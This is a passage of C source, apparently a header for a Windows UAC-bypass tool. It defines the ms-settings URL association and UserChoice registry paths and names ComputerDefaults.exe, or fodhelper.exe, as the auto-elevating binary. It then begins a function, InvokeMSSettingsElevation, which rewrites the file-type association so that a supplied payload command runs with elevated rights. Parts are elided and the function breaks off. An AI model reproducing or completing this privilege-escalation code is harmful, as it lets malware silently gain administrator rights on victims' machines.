#ifndef MSSETTINGSFTA_H
#define MSSETTINGSFTA_H
...
STRINGW(mssettings, "ms-settings")
STRINGW(hash, "Hash")
...
STRINGW(open, "open")
STRINGW(autoele_exe, "\\System32\\ComputerDefaults.exe") // or fodhelper.exe
STRINGW(assoc, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\ms-settings")
STRINGW(subkey, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\ms-settings\\UserChoice")
...
int InvokeMSSettingsElevation(const wchar_t* payloadCmd) {
    NT_API api;
    ...
    if (!SetFTA(&api, hRoot, progid, mssettings))
    {
        api.NtClose(hRoot);
        return result;
    }
